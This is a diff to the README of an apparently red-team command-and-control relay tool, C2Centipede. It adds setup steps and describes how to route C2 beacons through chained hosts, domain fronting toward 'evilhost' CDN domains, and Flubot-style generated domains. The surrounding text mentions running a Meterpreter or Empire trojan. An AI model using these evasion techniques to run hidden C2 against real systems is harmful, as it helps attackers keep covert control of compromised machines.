@@ -10,6 +10,11 @@ The server component receives the requests from the c2centipede client, decrypts
 
 Additionally there is a GUI for the operator.
 
+## Setup
+git clone https://github.com/deepsight/C2Centipede
+cd C2Centipede
+git clone https://github.com/fatedier/frp
+
 
 ## Sample commands
 
@@ -47,3 +52,19 @@ wine pyinstaller.exe --onefile --noconsole c2c_client.py
 2)Generate your meterpreter, empire or other trojan pointing to localhost and the port specified on the -p argument (in this case 2233)
 
 3)Run the trojan
+
+## Supported C2 routes
+
+The C2 communication can be routed through many hosts. They can be setup when executing the c2centipede client with the -s or -t flags. 
+
+Direct or connections through HTTP proxies (like FRP) can be specified as ip:port e.g. "-s 123.123.123.123:2222 222.333.45.23:80"
+
+Domain fronting can be specified in the following format: -s fronted{hightrustdomain.com{evilhost.yourcdnprovider.com fronted{anotherdomain.com{evilhost.yourcdnprovider.com fronted{anotherhightrustdomain.com{evilhost.anothercdn.com
+
+Flubot DGA can be used to bootstrap your C2 connection, the syntax is flubot{seed{numberofdomains{port
+This is based on this great post: https://securityblog.switch.ch/2021/06/19/android-flubot-enters-switzerland/
+
+
+## TODO
+Treat this as alpha quality code, it's meant to be a PoC for beaconing evasion.
+I have tested very basic functionality for doing C2 comms through webdav, so this might come later.
